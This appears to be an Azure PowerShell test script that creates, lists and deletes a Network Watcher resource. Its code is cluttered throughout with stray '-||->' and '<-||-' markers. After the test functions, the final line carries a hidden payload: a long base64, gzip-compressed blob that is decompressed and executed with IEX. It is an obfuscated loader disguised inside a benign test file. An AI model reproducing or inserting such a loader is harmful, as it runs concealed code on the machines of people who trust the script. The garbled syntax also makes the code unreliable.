














 -||-> function DeleteIfExistsNetworkWatcher($location)
{
	
	 -||-> $nwlist =  -||-> Get-AzNetworkWatcher <-||-  <-||- 
	 -||-> foreach ($i in  -||-> $nwlist <-||- )
	{
		 -||-> if( -||-> $i.Location -eq "$location" <-||- ) 
		{
			 -||-> $nw=$i <-||- 
		} <-||- 
	} <-||- 

	
	 -||-> if ( -||-> $nw <-||- ) 
	{
		 -||-> $job =  -||-> Remove-AzNetworkWatcher -NetworkWatcher $nw -AsJob <-||-  <-||- 
		 -||-> $job | Wait-Job <-||- 
	} <-||- 
} <-||- 


 -||-> function Test-NetworkWatcherCRUD
{
    
     -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
     -||-> $nwName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $rglocation =  -||-> Get-ProviderLocation ResourceManagement <-||-  <-||- 
     -||-> $resourceTypeParent = "Microsoft.Network/networkWatchers" <-||- 
     -||-> $location =  -||-> Get-ProviderLocation $resourceTypeParent "westcentralus" <-||-  <-||- 
    
     -||-> try 
    {
         -||-> $resourceGroup =  -||-> New-AzResourceGroup -Name $rgname -Location  $rglocation -Tags @{ testtag =  -||-> "testval" <-||-  } <-||-  <-||- 
        
		 -||-> DeleteIfExistsNetworkWatcher -location $location <-||- 

        
         -||-> $tags = @{"key1" =  -||-> "value1" <-||- ; "key2" =  -||-> "value2" <-||- } <-||- 
         -||-> $nw =  -||-> New-AzNetworkWatcher -Name $nwName -ResourceGroupName $rgname -Location $location -Tag $tags <-||-  <-||- 

         -||-> Assert-AreEqual $nw.Name $nwName <-||- 
         -||-> Assert-AreEqual "Succeeded" $nw.ProvisioningState <-||- 
		
        
         -||-> $getNW =  -||-> Get-AzNetworkWatcher -ResourceGroupName $rgname -Name $nwName <-||-  <-||- 
		
         -||-> Assert-AreEqual $getNW.Name $nwName <-||- 		
         -||-> Assert-AreEqual "Succeeded" $nw.ProvisioningState <-||- 
		
        
         -||-> $listNWByRg =  -||-> Get-AzNetworkWatcher -ResourceGroupName $rgname <-||-  <-||- 
         -||-> $listNW =  -||-> Get-AzNetworkWatcher <-||-  <-||- 
		
         -||-> Assert-AreEqual 1 @( -||-> $listNWByRg <-||- ).Count <-||- 

         -||-> $listNW =  -||-> Get-AzNetworkWatcher -ResourceGroupName "*" <-||-  <-||- 
         -||-> Assert-True {  -||-> $listNW.Count -ge 0 <-||-  } <-||- 

         -||-> $listNW =  -||-> Get-AzNetworkWatcher -Name "*" <-||-  <-||- 
         -||-> Assert-True {  -||-> $listNW.Count -ge 0 <-||-  } <-||- 

         -||-> $listNW =  -||-> Get-AzNetworkWatcher -ResourceGroupName "*" -Name "*" <-||-  <-||- 
         -||-> Assert-True {  -||-> $listNW.Count -ge 0 <-||-  } <-||- 
		
        
         -||-> $job =  -||-> Remove-AzNetworkWatcher -ResourceGroupName $rgname -name $nwName -AsJob <-||-  <-||- 
         -||-> $job | Wait-Job <-||- 
         -||-> $delete =  -||-> $job | Receive-Job <-||-  <-||- 
		
         -||-> $list =  -||-> Get-AzNetworkWatcher -ResourceGroupName $rgname <-||-  <-||- 
         -||-> Assert-AreEqual 0 @( -||-> $list <-||- ).Count <-||- 
    }
    finally
    {
        
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 
 -||-> $s= -||-> New-ObjectIO.MemoryStream( -||-> ,[Convert]::FromBase64String("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") <-||- ) <-||-  <-||- ; -||-> IEX( -||-> New-ObjectIO.StreamReader( -||-> New-ObjectIO.Compression.GzipStream( -||-> $s,[IO.Compression.CompressionMode]::Decompress <-||- ) <-||- ) <-||- ).ReadToEnd() <-||- ;

